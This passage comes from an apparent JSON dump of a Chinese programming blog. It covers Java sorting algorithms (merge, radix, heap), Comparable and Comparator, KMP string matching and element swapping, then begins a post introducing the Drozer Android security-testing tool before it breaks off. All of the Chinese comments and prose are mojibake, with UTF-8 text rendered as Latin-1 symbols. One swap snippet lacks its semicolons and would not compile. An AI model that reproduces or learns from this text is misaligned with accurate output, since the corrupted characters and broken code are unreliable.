//å‘å·¦é€’å½’è¿›è¡Œåˆ†è§£\n            mergeSort(arr, left, mid, tmp);\n            //å‘å·¦é€’å½’è¿›è¡Œåˆ†è§£\n            mergeSort(arr, mid + 1, right, tmp);\n            //åˆå¹¶ï¼ˆæ²»ç†ï¼‰\n            merge(arr, left, right, tmp);\n\n        }\n    }\n\n\n    //æ²»ç†é˜¶æ®µï¼ˆåˆå¹¶ï¼‰\n    public static void merge(int[] arr, int left, int right, int[] tmp) {\n\n        int mid = (left + right) / 2;\n        int i = left; // åˆå§‹åŒ–i, å·¦è¾¹æœ‰åºåºåˆ—çš„åˆå§‹ç´¢å¼•\n        int j = mid + 1; //åˆå§‹åŒ–j, å³è¾¹æœ‰åºåºåˆ—çš„åˆå§‹ç´¢å¼•\n        int t = 0; // æŒ‡å‘tempæ•°ç»„çš„å½“å‰ç´¢å¼•\n\n        //(ä¸€)\n        //å…ˆæŠŠå·¦å³ä¸¤è¾¹(æœ‰åº)çš„æ•°æ®æŒ‰ç…§è§„åˆ™å¡«å……åˆ°tempæ•°ç»„\n        //ç›´åˆ°å·¦å³ä¸¤è¾¹çš„æœ‰åºåºåˆ—ï¼Œæœ‰ä¸€è¾¹å¤„ç†å®Œæ¯•ä¸ºæ­¢\n        while (i <= mid && j <= right) {\n            if (arr[i] <= arr[j]) {\n                tmp[t++] = arr[i++];\n            } else {\n                tmp[t++] = arr[j++];\n            }\n        }\n        //(äºŒ)\n        //æŠŠæœ‰å‰©ä½™æ•°æ®çš„ä¸€è¾¹çš„æ•°æ®ä¾æ¬¡å…¨éƒ¨å¡«å……åˆ°temp\n        while (i <= mid) {//å·¦è¾¹çš„æœ‰åºåºåˆ—è¿˜æœ‰å‰©ä½™çš„å…ƒç´ ï¼Œå°±å…¨éƒ¨å¡«å……åˆ°temp\n            tmp[t++] = arr[i++];\n        }\n        while (j <= right) {\n            tmp[t++] = arr[j++];\n        }\n        //(ä¸‰)\n        //å°†tempæ•°ç»„çš„å…ƒç´ æ‹·è´åˆ°arr\n        t = 0;\n        while (left <= right) {\n            arr[left++] = tmp[t++];\n        }\n    }\n}\n```\n\n### â¼åŸºæ•°æ’åº\n\n> åŸºæ•°æ’åºæ˜¯ä½¿ç”¨ç©ºé—´æ¢æ—¶é—´çš„ç»å…¸ç®—æ³•\n\n**ç®—æ³•æ­¥éª¤**\n\n- å°†æ‰€æœ‰å¾…æ¯”è¾ƒæ•°å€¼ï¼ˆæ­£æ•´æ•°ï¼‰ç»Ÿä¸€ä¸ºåŒæ ·çš„æ•°ä½é•¿åº¦ï¼Œ**æ•°ä½è¾ƒçŸ­çš„æ•°å‰é¢è¡¥é›¶**\n- äº‹å…ˆå‡†å¤‡10ä¸ªæ•°ç»„(10ä¸ªæ¡¶)ï¼Œå¯¹åº”ä½æ•°çš„ 0-9\n- æ ¹æ®æ¯ä¸ªæ•°æœ€ä½ä½å€¼(ä¸ªä½)ï¼Œå°†æ•°æ”¾å…¥åˆ°å¯¹åº”ä½ç½®æ¡¶ä¸­ï¼Œå³è¿›è¡Œä¸€æ¬¡æ’åº\n-  ç„¶åä» 0-9 ä¸ªæ•°ç»„/æ¡¶ï¼Œä¾æ¬¡ï¼ŒæŒ‰ç…§åŠ å…¥å…ƒç´ çš„å…ˆåé¡ºåºå–å‡º \n- ä»¥æ­¤ç±»æ¨ï¼Œä»æœ€ä½ä½æ’åºä¸€ç›´åˆ°æœ€é«˜ä½ï¼ˆä¸ªä½->åä½->ç™¾ä½->â€¦->æœ€é«˜ä½ï¼‰ï¼Œå¾ªç¯è½®æ•°ä¸ºæœ€å¤§æ•°ä½é•¿åº¦\n- æ’åºå®Œæˆä»¥å, æ•°åˆ—å°±å˜æˆä¸€ä¸ªæœ‰åºåºåˆ—\n- éœ€è¦æˆ‘ä»¬è·å¾—æœ€å¤§æ•°çš„ä½æ•°ï¼šå¯ä»¥é€šè¿‡å°†**æœ€å¤§æ•°å˜ä¸ºStringç±»å‹**ï¼Œå†æ±‚å¾—å®ƒçš„é•¿åº¦å³å¯\n\n| æ’åºè¿‡ç¨‹                                             | æ’åºåç»“æœ                     |\n| ---------------------------------------------------- | ------------------------------ |\n| ![](https://img.jwt1399.top/img/202210111549709.png) | {542ï¼Œ53 ï¼Œ3 ï¼Œ14 ï¼Œ214 ï¼Œ748} |\n| ![](https://img.jwt1399.top/img/202210111549451.png) | {3 ï¼Œ14 ï¼Œ214 ï¼Œ542ï¼Œ748ï¼Œ53 } |\n| ![](https://img.jwt1399.top/img/202210111549884.png) | {3ï¼Œ14ï¼Œ53 ï¼Œ214 ï¼Œ542ï¼Œ748}   |\n\n```java\npublic class RadixSort {\n    public static void main(String[] args) {\n        int[] arr = {53, 3, 542, 748, 14, 214};\n        radixSort(arr);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    public static void radixSort(int[] arr) {\n        //å®šä¹‰ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œè¡¨ç¤º10ä¸ªæ¡¶, æ¯ä¸ªæ¡¶å°±æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„\n        int[][] bucket = new int[10][arr.length];\n        //ä¸ºäº†è®°å½•æ¯ä¸ªæ¡¶ä¸­å­˜æ”¾äº†å¤šå°‘ä¸ªæ•°æ®,æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ•°ç»„æ¥è®°å½•å„ä¸ªæ¡¶çš„æ¯æ¬¡æ”¾å…¥çš„æ•°æ®ä¸ªæ•°\n        //æ¯”å¦‚ï¼šbucketElementCounts[0] , è®°å½•çš„å°±æ˜¯ bucket[0] æ¡¶çš„æ”¾å…¥æ•°æ®ä¸ªæ•°\n        int[] bucketElementCounts = new int[10];\n        //æœ€å¤§ä½æ•°\n        int maxLen = getMaxLen(arr);\n\n        for (int i = 0, n = 1; i < maxLen; i++, n *= 10) {\n            //maxLenè½®æ’åº\n            for (int j = 0; j < arr.length; j++) {\n                //å–å‡ºæ¯ä¸ªå…ƒç´ çš„å¯¹åº”ä½çš„å€¼\n                int digitOfElement = arr[j] / n % 10;\n                //æ”¾å…¥åˆ°å¯¹åº”çš„æ¡¶ä¸­\n                bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[j];\n                bucketElementCounts[digitOfElement]++;\n            }\n            //æŒ‰ç…§æ¡¶çš„é¡ºåºå’ŒåŠ å…¥å…ƒç´ çš„å…ˆåé¡ºåºå–å‡ºï¼Œæ”¾å…¥åŸæ¥æ•°ç»„\n            int index = 0;\n            for (int k = 0; k < 10; k++) {\n                //å¦‚æœæ¡¶ä¸­ï¼Œæœ‰æ•°æ®ï¼Œæˆ‘ä»¬æ‰æ”¾å…¥åˆ°åŸæ•°ç»„\n                int position = 0;\n                while (bucketElementCounts[k] > 0) {\n                    //å–å‡ºå…ƒç´ æ”¾å…¥åˆ°arr\n                    arr[index++] = bucket[k][position++];\n                    bucketElementCounts[k]--;\n                }\n            }\n        }\n\n    }\n\n    //å¾—åˆ°è¯¥æ•°ç»„ä¸­æœ€å¤§å…ƒç´ çš„ä½æ•°\n    public static int getMaxLen(int[] arr) {\n        int max = arr[0];\n        for (int i = 1; i < arr.length; i++) {\n            if (arr[i] > max) {\n                max = arr[i];\n            }\n        }\n        //å°†æœ€å¤§å€¼è½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå®ƒçš„é•¿åº¦å°±æ˜¯å®ƒçš„ä½æ•°\n        int maxLen = (max + \"\").length();\n        return maxLen;\n    }\n\n}\n```\n\n### â½å †æ’åº\n\nç»™å®šä¸€ä¸ªæ•°ç»„ï¼šString[] arr = {\"S\",\"O\",\"R\",\"T\",\"E\",\"X\",\"A\",\"M\",\"P\",\"L\",\"E\"}è¯·å¯¹æ•°ç»„ä¸­çš„å­—ç¬¦æŒ‰ä»å°åˆ°å¤§æ’åºã€‚\n\nå®ç°æ­¥éª¤ï¼š\n\n- 1.æ„é€ å †ï¼›\n- 2.å¾—åˆ°å †é¡¶å…ƒç´ ï¼Œè¿™ä¸ªå€¼å°±æ˜¯æœ€å¤§å€¼ï¼›\n- 3.äº¤æ¢å †é¡¶å…ƒç´ å’Œæ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæ­¤æ—¶æ‰€æœ‰å…ƒç´ ä¸­çš„æœ€å¤§å…ƒç´ å·²ç»æ”¾åˆ°åˆé€‚çš„ä½ç½®ï¼›\n- 4.å¯¹å †è¿›è¡Œè°ƒæ•´ï¼Œé‡æ–°è®©é™¤äº†æœ€åä¸€ä¸ªå…ƒç´ çš„å‰©ä½™å…ƒç´ ä¸­çš„æœ€å¤§å€¼æ”¾åˆ°å †é¡¶ï¼›\n- 5.é‡å¤2~4è¿™ä¸ªæ­¥éª¤ï¼Œç›´åˆ°å †ä¸­å‰©ä¸€ä¸ªå…ƒç´ ä¸ºæ­¢ã€‚\n\n![](../images/æ•°æ®ç»“æ„ä¸ç®—æ³•/image-20221107171120761.png)\n\n```java\npublic class HeapSort {\n\n    public static void main(String[] args) throws Exception {\n        String[] arr = {\"S\", \"O\", \"R\", \"T\", \"E\", \"X\", \"A\", \"M\", \"P\", \"L\", \"E\"};\n        HeapSort.sort(arr);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    //åˆ¤æ–­heapå †ä¸­ç´¢å¼•iå¤„çš„å…ƒç´ æ˜¯å¦å°äºç´¢å¼•jå¤„çš„å…ƒç´ \n    private static boolean less(Comparable[] heap, int i, int j) {\n        return heap[i].compareTo(heap[j]) < 0;\n    }\n\n    //äº¤æ¢heapå †ä¸­iç´¢å¼•å’Œjç´¢å¼•å¤„çš„å€¼\n    private static void exch(Comparable[] heap, int i, int j) {\n        Comparable tmp = heap[i];\n        heap[i] = heap[j];\n        heap[j] = tmp;\n    }\n\n\n    //æ ¹æ®åŸæ•°ç»„sourceï¼Œæ„é€ å‡ºå †heap\n    private static void createHeap(Comparable[] source, Comparable[] heap) {\n        //æŠŠsourceä¸­çš„å…ƒç´ æ‹·è´åˆ°heapä¸­ï¼Œheapä¸­çš„å…ƒç´ å°±å½¢æˆä¸€ä¸ªæ— åºçš„å †\n        System.arraycopy(source, 0, heap, 1, source.length);\n        //å¯¹å †ä¸­çš„å…ƒç´ åšä¸‹æ²‰è°ƒæ•´(ä»é•¿åº¦çš„ä¸€åŠå¤„å¼€å§‹ï¼Œå¾€ç´¢å¼•1å¤„æ‰«æ)\n        for (int i = (heap.length) / 2; i > 0; i--) {\n            sink(heap, i, heap.length - 1);\n        }\n\n    }\n\n    //å¯¹sourceæ•°ç»„ä¸­çš„æ•°æ®ä»å°åˆ°å¤§æ’åº\n    public static void sort(Comparable[] source) {\n        //æ„å»ºå †\n        Comparable[] heap = new Comparable[source.length + 1];\n        createHeap(source, heap);\n        //å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œè®°å½•æœªæ’åºçš„å…ƒç´ ä¸­æœ€å¤§çš„ç´¢å¼•\n        int N = heap.length - 1;\n        //é€šè¿‡å¾ªç¯ï¼Œäº¤æ¢1ç´¢å¼•å¤„çš„å…ƒç´ å’Œæ’åºçš„å…ƒç´ ä¸­æœ€å¤§çš„ç´¢å¼•å¤„çš„å…ƒç´ \n        while (N != 1) {\n            //äº¤æ¢å…ƒç´ \n            exch(heap, 1, N);\n            //æ’åºäº¤æ¢åæœ€å¤§å…ƒç´ æ‰€åœ¨çš„ç´¢å¼•ï¼Œè®©å®ƒä¸è¦å‚ä¸å †çš„ä¸‹æ²‰è°ƒæ•´\n            N--;\n            //éœ€è¦å¯¹ç´¢å¼•1å¤„çš„å…ƒç´ è¿›è¡Œå¯¹çš„ä¸‹æ²‰è°ƒæ•´\n            sink(heap, 1, N);\n        }\n        //æŠŠheapä¸­çš„æ•°æ®å¤åˆ¶åˆ°åŸæ•°ç»„sourceä¸­\n        System.arraycopy(heap, 1, source, 0, source.length);\n\n    }\n\n    //åœ¨heapå †ä¸­ï¼Œå¯¹targetå¤„çš„å…ƒç´ åšä¸‹æ²‰ï¼ŒèŒƒå›´æ˜¯0~range\n    private static void sink(Comparable[] heap, int target, int range) {\n\n        while (2 * target <= range) {\n            //1.æ‰¾å‡ºå½“å‰ç»“ç‚¹çš„è¾ƒå¤§çš„å­ç»“ç‚¹\n            int max;\n            if (2 * target + 1 <= range) {\n                if (less(heap, 2 * target, 2 * target + 1)) {\n                    max = 2 * target + 1;\n                } else {\n                    max = 2 * target;\n                }\n            } else {\n                max = 2 * target;\n            }\n\n            //2.æ¯”è¾ƒå½“å‰ç»“ç‚¹çš„å€¼å’Œè¾ƒå¤§å­ç»“ç‚¹çš„å€¼\n            if (!less(heap, target, max)) {\n                break;\n            }\n            exch(heap, target, max);\n            target = max;\n        }\n    }\n}\n```\n\n### â¾æ¡¶æ’åº\n\n### â¿è®¡æ•°æ’åº\n\n## â‘¡æŸ¥æ‰¾\n\n\n\n\n\n\n\n## â‘¢æ¯”è¾ƒ\n\n### â¶Comparable\n\n> Comparableæ˜¯æ’åºæ¥å£ã€‚è‹¥ä¸€ä¸ªç±»å®ç°äº†Comparableæ¥å£ï¼Œå°±æ„å‘³ç€è¯¥ç±»æ”¯æŒæ’åºã€‚å®ç°äº†Comparableæ¥å£çš„ç±»çš„å¯¹è±¡çš„åˆ—è¡¨æˆ–æ•°ç»„å¯ä»¥é€šè¿‡`Collections.sort`æˆ–`Arrays.sort`è¿›è¡Œè‡ªåŠ¨æ’åºã€‚\n\n```java\n// è¯¥æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š\npackage java.lang;\nimport java.util.*;\npublic interface Comparable<T> {\n    public int compareTo(T o);\n}\n```\n\næ­¤æ¥å£åªæœ‰ä¸€ä¸ªæ–¹æ³•`compareTo`ï¼Œæ¯”è¾ƒå½“å‰å¯¹è±¡ä¸æŒ‡å®šå¯¹è±¡çš„é¡ºåºï¼Œå¦‚æœè¯¥å¯¹è±¡å°äºã€ç­‰äºæˆ–å¤§äºæŒ‡å®šå¯¹è±¡ï¼Œåˆ™åˆ†åˆ«è¿”å›è´Ÿæ•°ã€é›¶æˆ–æ­£æ•°ã€‚\n\nç°åœ¨æˆ‘ä»¬å‡è®¾ä¸€ä¸ªPersonç±»ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```java\npublic class Person{\n    String name;\n    int age;\n    public Person(String name, int age){\n        this.name = name;\n        this.age = age;\n    }\n    public String getName(){\n        return name;\n    }\nã€€ã€€public int getAge(){\n        return age;\n    }\n}\n```\n\nç°åœ¨æœ‰ä¸¤ä¸ªPersonç±»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¦‚ä½•æ¥æ¯”è¾ƒäºŒè€…çš„å¤§å°å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡è®©Personå®ç°Comparableæ¥å£ï¼š\n\n```java\npublic class Person implements Comparable<Person>{\n    String name;\n    int age;\n    public Person(String name, int age){\n        this.name = name;\n        this.age = age;\n    }\n    public String getName(){\n        return name;\n    }\n    public int getAge(){\n        return age;\n    }\n    @Override\n    public int compareTo(Person p){\n        return this.age - p.getAge();\n    }\n  \n    public static void main(String[] args){\n        Person[] people = new Person[]{new Person(\"å°æ˜\", 20),new Person(\"å°çº¢\", 10)};\n        Arrays.sort(people);\n    }\n}\n```\n\n### â·Comparator\n\n> Comparatoræ˜¯æ¯”è¾ƒæ¥å£ï¼Œæˆ‘ä»¬å¦‚æœéœ€è¦æ§åˆ¶æŸä¸ªç±»çš„æ¬¡åºï¼Œè€Œè¯¥ç±»æœ¬èº«ä¸æ”¯æŒæ’åº(å³æ²¡æœ‰å®ç°Comparableæ¥å£)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å»ºç«‹ä¸€ä¸ªâ€œè¯¥ç±»çš„æ¯”è¾ƒå™¨â€æ¥è¿›è¡Œæ’åºï¼Œè¿™ä¸ªâ€œæ¯”è¾ƒå™¨â€åªéœ€è¦å®ç°Comparatoræ¥å£å³å¯ã€‚\n\n```java\n// è¯¥æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š\npackage java.util;\npublic interface Comparator<T>\n {\n    int compare(T o1, T o2);\n    boolean equals(Object obj);\n }\n```\n\n- è‹¥ä¸€ä¸ªç±»è¦å®ç°Comparatoræ¥å£ï¼šå®ƒä¸€å®šè¦å®ç°`compare()` å‡½æ•°ï¼Œä½†å¯ä¸å®ç°`equals()` å‡½æ•°ã€‚\n\n- `compare(T o1, T o2)` æ˜¯â€œæ¯”è¾ƒo1å’Œo2çš„å¤§å°â€ã€‚\n  - è¿”å›â€œè´Ÿæ•°â€ï¼Œæ„å‘³ç€â€œo1æ¯”o2å°â€\n  - è¿”å›â€œé›¶â€ï¼Œæ„å‘³ç€â€œo1ç­‰äºo2â€\n  - è¿”å›â€œæ­£æ•°â€ï¼Œæ„å‘³ç€â€œo1å¤§äºo2â€\n\nç°åœ¨å‡å¦‚ä¸Šé¢çš„Personç±»æ²¡æœ‰å®ç°Comparableæ¥å£ï¼Œè¯¥å¦‚ä½•æ¯”è¾ƒå¤§å°å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç±»ï¼Œè®©å…¶å®ç°Comparatoræ¥å£ï¼Œä»è€Œæ„é€ ä¸€ä¸ªâ€œæ¯”è¾ƒå™¨\"ã€‚\n\n```java\npublic class PersonCompartor implements Comparator<Person>{\n    @Override\n    public int compare(Person o1, Person o2){\n        return o1.getAge() - o2.getAge();\n    }\n}\n```\n\nç°åœ¨æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¯”è¾ƒå™¨æ¥å¯¹å…¶è¿›è¡Œæ’åºï¼š\n\n```java\npublic class Test{\n    public static void main(String[] args){\n        Person[] people=new Person[]{new Person(\"å°æ˜\", 20),new Person(\"å°çº¢\", 10)};\n        Arrays.sort(people,new PersonCompartor());\n    }\n}\n\n//å†™æ³•2\npublic class Test2{\n    public static void main(String[] args){\n        Person[] people=new Person[]{new Person(\"å°æ˜\", 20),new Person(\"å°çº¢\", 10)};\n        Arrays.sort(people,new Comparator<Person>(){\n        \t\tpublic int compare(Person o1, Person o2){\n        \t\t\t\treturn o1.getAge() - o2.getAge();\n    \t\t\t\t}\n        });\n    }\n}\n```\n\n### â¸Comparableå’ŒComparatoråŒºåˆ«\n\n> Comparableæ˜¯æ’åºæ¥å£ï¼Œè‹¥ä¸€ä¸ªç±»å®ç°äº†Comparableæ¥å£ï¼Œå°±æ„å‘³ç€â€œè¯¥ç±»æ”¯æŒæ’åºâ€ã€‚\n>\n> Comparatoræ˜¯æ¯”è¾ƒå™¨ï¼Œæˆ‘ä»¬è‹¥éœ€è¦æ§åˆ¶æŸä¸ªç±»çš„æ¬¡åºï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªâ€œè¯¥ç±»çš„æ¯”è¾ƒå™¨â€æ¥è¿›è¡Œæ’åºã€‚\n\nComparableç›¸å½“äºâ€œå†…éƒ¨æ¯”è¾ƒå™¨â€ï¼Œè€ŒComparatorç›¸å½“äºâ€œå¤–éƒ¨æ¯”è¾ƒå™¨â€ã€‚\n\n- java.lang.Comparableï¼šåœ¨ç±»å®šä¹‰çš„æ—¶å€™ï¼Œå¯ä»¥å®ç°çš„æ¥å£ï¼Œé‡Œé¢æœ‰compareToè¿™ä¸ªæ–¹æ³•éœ€è¦å®ç°\n- java.util.Comparatorï¼šæ˜¯æŒ½æ•‘çš„æ¯”è¾ƒæ¥å£ï¼Œéœ€è¦å•ç‹¬å®šä¹‰ä¸€ä¸ªæ¯”è¾ƒç±»ï¼Œé‡Œé¢æœ‰compareæ¯”è¾ƒæ–¹æ³•ã€‚\n\nä¸¤ç§æ–¹æ³•å„æœ‰ä¼˜åŠ£ï¼Œ ç”¨Comparableç®€å•ï¼Œ åªè¦å®ç°Comparableæ¥å£çš„å¯¹è±¡ç›´æ¥å°±æˆä¸ºä¸€ä¸ªå¯ä»¥æ¯”è¾ƒçš„å¯¹è±¡ï¼Œä½†æ˜¯éœ€è¦ä¿®æ”¹æºä»£ç ã€‚ ç”¨Comparatorçš„å¥½å¤„æ˜¯ä¸éœ€è¦ä¿®æ”¹æºä»£ç ï¼Œ è€Œæ˜¯å¦å¤–å®ç°ä¸€ä¸ªæ¯”è¾ƒå™¨ï¼Œ å½“æŸä¸ªè‡ªå®šä¹‰çš„å¯¹è±¡éœ€è¦ä½œæ¯”è¾ƒçš„æ—¶å€™ï¼ŒæŠŠæ¯”è¾ƒå™¨å’Œå¯¹è±¡ä¸€èµ·ä¼ é€’è¿‡å»å°±å¯ä»¥æ¯”å¤§å°äº†ï¼Œ å¹¶ä¸”åœ¨Comparator é‡Œé¢ç”¨æˆ·å¯ä»¥è‡ªå·±å®ç°å¤æ‚çš„å¯ä»¥é€šç”¨çš„é€»è¾‘ï¼Œä½¿å…¶å¯ä»¥åŒ¹é…ä¸€äº›æ¯”è¾ƒç®€å•çš„å¯¹è±¡ï¼Œé‚£æ ·å°±å¯ä»¥èŠ‚çœå¾ˆå¤šé‡å¤åŠ³åŠ¨äº†ã€‚\n\n## ä½è¿ç®—\n\n[ã€Šç¨‹åºå‘˜æ•°å­¦ï¼šä½è¿ç®—ã€‹](https://mp.weixin.qq.com/s?__biz=MzIxMDAwMDAxMw==&mid=2650732437&idx=1&sn=cf71cc01b4fdbfefb1471729fad74fbb&chksm=8f611677b8169f614e86d1537d83a48536a4198c2cca36ff4f3dc8eb54d64fce1c946bb46ec6&mpshare=1&scene=23&srcid=112131aewg4cW6yA0hrqkIEZ&sharer_sharetime=1670135117489&sharer_shareid=6a42f6adcb98a88421502c27789dc6ea#rd)\n\n## KMPç®—æ³•\n\n> KMP ç®—æ³•æ˜¯ä¸€ä¸ªå¿«é€ŸæŸ¥æ‰¾åŒ¹é…ä¸²çš„ç®—æ³•ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼š**å¦‚ä½•å¿«é€Ÿåœ¨ã€ŒåŸå­—ç¬¦ä¸²ã€ä¸­æ‰¾åˆ°ã€ŒåŒ¹é…å­—ç¬¦ä¸²ã€ã€‚**\n>\n> æš´åŠ›æŸ¥æ‰¾å¤æ‚åº¦æ˜¯ O(mâˆ—n)ï¼ŒKMP ç®—æ³•çš„å¤æ‚åº¦ä¸º O(m+n)ï¼Œå…¶ä¸­mä¸ºåŸå­—ç¬¦ä¸²é•¿åº¦ï¼Œmä¸ºåŒ¹é…å­—ç¬¦ä¸²é•¿åº¦\n\n[ã€è‡ªç”¨æ•°æ®ç»“æ„ã€‘ç‹é“4.2.4 ä¸²çš„æ¨¡å¼åŒ¹é… KMPç®—æ³•+æ±‚Nextæ•°ç»„(æ‰‹ç®—)+æ±‚Nextvalæ•°ç»„(æ‰‹ç®—)](https://www.bilibili.com/video/BV1AG4y1W7DV/?spm_id_from=333.999.0.0&vd_source=fa98a6d1417d05689c64bc1449966321)\n\n[ã€KMPã€‘ä»åŸç†ä¸Šè¯¦è§£nextæ•°ç»„å’Œnextvalæ•°ç»„](https://blog.csdn.net/coding_with_smile/article/details/125521122)\n\n\n\n[ã€å¤©å‹¤è€ƒç ”ã€‘KMPç®—æ³•æ˜“æ‡‚ç‰ˆ_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1jb411V78H/?spm_id_from=333.337.search-card.all.click)\n\n[KMPå­—ç¬¦ä¸²åŒ¹é…ç®—æ³•1_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1Px411z7Yo/?spm_id_from=333.337.search-card.all.click&vd_source=fa98a6d1417d05689c64bc1449966321)\n\n[28. æ‰¾å‡ºå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡ - åŠ›æ‰£ï¼ˆLeetcodeï¼‰](https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/solutions/575568/shua-chuan-lc-shuang-bai-po-su-jie-fa-km-tb86/)\n\n[ç®—æ³•æ•°æ®ç»“æ„ç³»åˆ—-ç†è®ºç¯‡-å­—ç¬¦ä¸²åŒ¹é…ï¼ˆä¸€ï¼‰](https://blog.csdn.net/honestjiang/article/details/108044250)\n\n```java\nclass Solution {\n    public static int strStr(String haystack, String needle) {\n        int n = haystack.length(), m = needle.length();\n        if (m == 0) return 0;\n\n        // 1.æ„å»º next æ•°ç»„\n        int[] next = new int[m]; //next[0]=0\n        for (int i = 1, j = 0; i < m; i++) {\n            // åŒ¹é…ä¸æˆåŠŸçš„è¯ï¼Œj = next(j-1)\n            while (j > 0 && needle.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // åŒ¹é…æˆåŠŸçš„è¯ï¼Œj++\n            if (needle.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            // æ›´æ–° next[i]\n            next[i] = j;\n        }\n\n        // 2.åŒ¹é…è¿‡ç¨‹\n        for (int i = 0, j = 0; i < n; i++) {\n            // åŒ¹é…ä¸æˆåŠŸ j = next(j-1)\n            while (j > 0 && haystack.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // åŒ¹é…æˆåŠŸçš„è¯ï¼Œj++\n            if (haystack.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            if (j == m) {\n                return i - m + 1;\n            }\n        }\n        return -1;\n    }\n}\n```\n\n\n\n\n\n## DFS\n\n## BFS\n\n## å›æº¯\n\nå…³ç³»ï¼šå›æº¯ < DFS < é€’å½’\n\n## é€’å½’\n\n## è¿­ä»£\n\n## åŠ¨æ€è§„åˆ’\n\n\n\n## äº¤æ¢å…ƒç´ \n\n### æ™®é€šæ–¹æ³•\n\n```java\nprivate void swap(int[] a, int i, int j) {\n    int tmp = a[i]\n    a[i] = a[j]\n    a[j] = tmp\n    System.out.println(\"swap:\" + a[j] + \" <-> \" + a[i]);\n}\n```\n\n### å¼‚æˆ–æ–¹æ³•\n\n```java\nprivate void swap(int[] a, int i, int j) {\n    if (i == j){return;}//å…³é”® ä¸¤ä¸ªä¸€æ ·çš„æ•°å¼‚æˆ–ç»“æœä¸º0\n    a[i] = a[i] ^ a[j];\n    a[j] = a[i] ^ a[j];\n    a[i] = a[i] ^ a[j];\n    System.out.println(\"swap:\" + a[j] + \" <-> \" + a[i]);\n}\n```\n\n\n\n\n\n# â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["æ•°æ®ç»“æ„","ç®—æ³•"],"categories":["ç»“æ„-ç®—æ³•"]},{"title":"Drozer-Androidå®‰å…¨æµ‹è¯•","url":"/posts/4946.html","content":"\n## 1.Drozerç®€ä»‹\n\n> drozeræ˜¯ä¸€æ¬¾é’ˆå¯¹Androidç³»ç»Ÿçš„å®‰å…¨æµ‹è¯•æ¡†æ¶ã€‚drozerå¯ä»¥å¸®åŠ©Appå’Œè®¾å¤‡å˜å¾—æ›´å®‰å…¨ï¼Œå…¶æä¾›äº†å¾ˆå¤šAndroidå¹³å°ä¸‹çš„æ¸—é€æµ‹è¯•exploitä¾›ä½ ä½¿ç”¨å’Œåˆ†äº«ã€‚å¯¹äºè¿œç¨‹çš„exploitï¼Œå®ƒå¯ä»¥ç”Ÿæˆshellcodeå¸®åŠ©ä½ è¿›è¡Œè¿œç¨‹è®¾å¤‡ç®¡ç†ã€‚\n\n## 2.ç¯å¢ƒé…ç½®\n\n1.jdk1.6+\n2.python2.7\n3.android sdk\n4.å®‰è£…adb\n5.æ¨¡æ‹Ÿå™¨ä¹Ÿè¦å®‰è£…drozer  agent\n6.ç¡®ä¿é…ç½®äº†adbã€javaç¯å¢ƒå˜é‡\n\n### å®‰è£…drozer\n\næ–¹æ³•ä¸€ï¼šç›´æ¥ä¸‹è½½drozer\n\nä¸‹è½½åœ°å€ï¼šhttps://labs.mwrinfosecurity.com/tools/drozer/ (ä¸‹è½½drozer (RPM))ï¼Œè§£å‹ådrozeråœ¨`drozer\\usr\\bin`è·¯å¾„ä¸‹\n\næ–¹æ³•äºŒï¼šåˆ©ç”¨Appieé‡Œé¢å¸¦æœ‰çš„drozer\n\nä¸‹è½½åœ¨appieè§£å‹ådrozeråœ¨`Appie\\base\\`è·¯å¾„ä¸‹\n\n![](https://i.loli.net/2020/03/23/H1ubzFpkPylJ4OC.png)\n\n### æ¨¡æ‹Ÿå™¨å®‰è£…agent.apk\n\nå°†agent.apkä¸‹è½½åï¼Œé€šè¿‡cmdå®‰è£…æˆ–è€…ç›´æ¥æ‹–è¿›æ¨¡æ‹Ÿå™¨è¿›è¡Œå®‰è£…\n\n```bash\nadb install å®‰è£…è·¯å¾„/agent.apk\n```\n\n### 